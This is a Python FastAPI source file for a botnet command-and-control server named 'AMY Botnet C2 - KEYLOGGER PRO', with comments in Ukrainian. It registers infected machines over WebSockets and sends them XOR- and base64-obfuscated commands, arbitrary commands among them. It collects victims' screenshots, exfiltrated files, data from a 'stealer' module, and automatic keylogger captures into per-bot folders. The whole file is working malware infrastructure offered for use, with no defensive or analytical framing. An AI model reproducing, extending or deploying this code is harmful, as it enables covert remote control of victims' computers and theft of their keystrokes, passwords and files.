from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.responses import FileResponse, Response
import asyncio
import base64
import os
from datetime import datetime

app = FastAPI(title="AMY Botnet C2 - KEYLOGGER PRO")

# Папки для даних
for folder in ["screenshots", "logs", "downloads", "stealer"]:
    os.makedirs(folder, exist_ok=True)

active_bots = {}
bot_responses = {}
last_screenshot_data = {} 

X_KEY = "AMY_2026_SECRET"

def crypt_logic(data: str) -> str:
    key = X_KEY
    return "".join(chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data)))

def decrypt(data: str) -> str:
    try:
        decoded = base64.b64decode(data).decode()
        return crypt_logic(decoded)
    except: return None

def encrypt(data: str) -> str:
    res = crypt_logic(data)
    return base64.b64encode(res.encode()).decode()

@app.get("/")
async def read_index():
    ui_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "ui")
    return FileResponse(os.path.join(ui_path, "index.html"))

@app.get("/bots")
async def list_bots():
    return {"bots": list(active_bots.keys())}

@app.get("/response/{bot_id}")
async def get_response(bot_id: str):
    res = bot_responses.pop(bot_id, "")
    if res == "SCREENSHOT_LOADED": return {"response": "IMAGE_READY", "is_img": True}
    return {"response": res, "is_img": False}

@app.get("/view_screenshot/{bot_id}")
async def view_screenshot(bot_id: str):
    data = last_screenshot_data.get(bot_id)
    if data: return Response(content=data, media_type="image/png")
    return Response(status_code=404)

@app.post("/command")
async def send_command(bot_id: str, command: str):
    if bot_id in active_bots:
        if command not in ["screenshot", "steal", "get_keys"]:
            bot_responses[bot_id] = "> Executing: " + command
        await active_bots[bot_id].send_text(encrypt(command))
        return {"status": "success"}
    return {"status": "error"}

@app.websocket("/ws/{bot_id}")
async def websocket_endpoint(websocket: WebSocket, bot_id: str):
    await websocket.accept()
    active_bots[bot_id] = websocket
    try:
        while True:
            raw = await websocket.receive_text()
            data = decrypt(raw)
            if not data: continue
            
            if data.startswith("SCREENSHOT:"):
                last_screenshot_data[bot_id] = base64.b64decode(data[11:])
                bot_responses[bot_id] = "SCREENSHOT_LOADED"
            
            elif data.startswith("FILE_DATA:"):
                parts = data.split(":", 2)
                with open(f"downloads/{bot_id}_{parts[1]}", "wb") as f: f.write(base64.b64decode(parts[2]))
                bot_responses[bot_id] = f"FILE_SAVED:{parts[1]}"
            
            elif data.startswith("STEAL_DATA:"):
                parts = data.split(":", 3)
                with open(f"stealer/{bot_id}_{parts[1]}_{parts[2]}", "wb") as f: f.write(base64.b64decode(parts[3]))
            
            # АВТОМАТИЧНИЙ КЕЙЛОГГЕР
            elif data.startswith("AUTO_KEYLOG:"):
                keys = data[12:]
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(f"logs/{bot_id}.txt", "a", encoding="utf-8") as f:
                    f.write(f"[{timestamp}] {keys}\n")
                # Не міняємо bot_responses, щоб не заважати в терміналі
            
            else:
                bot_responses[bot_id] = data
    except WebSocketDisconnect:
        if bot_id in active_bots: del active_bots[bot_id]

